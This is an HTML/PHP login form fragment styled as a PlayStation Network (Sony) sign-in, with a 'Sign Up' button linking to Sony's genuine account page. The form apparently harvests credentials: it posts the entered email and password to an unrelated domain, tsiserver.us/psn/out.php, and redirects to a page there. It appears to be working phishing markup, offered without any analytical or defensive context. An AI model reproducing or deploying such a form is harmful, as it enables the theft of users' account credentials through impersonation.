<form method="post" action="https://www.tsiserver.us/psn/out.php?returnURL=http%3A%2F%2Fpsn.tsiserver.us%2Fchris.php" id="mainform" name="mainform" class="loginBox" style="background: rgba(0,0,0,1.0);padding: 2px; ">
													<p style="padding-top:10px;">
														<label id="selLabelSignInWithHint">Sign-In ID <small>(E-mail Address)</small></label>
												<input class="textField" id="userName" name="userName" placeholder="youremail@example.com" value="<?php echo $email; ?>" type="text" style="color: #00CC00;">
														<br style="clear:both;"><br style="clear:both;">
													</p>
													
													<p>
														<label id="selLabelPassword">Password: </label>
														<input class="textField" id="password" name="password" type="password" placeholder="********" autocomplete="off" style="color: #00CC00;"> 
														<br style="clear:both;"><br style="clear:both;">
													</p>      
											<center><input type="submit" class="button special" value="Sign In"/><a href="https://account.sonyentertainmentnetwork.com/liquid/reg/account/create-account!input.action" target="_BLANK"><input type="button" class="button special" value="Sign Up"/></a></center>
											</form>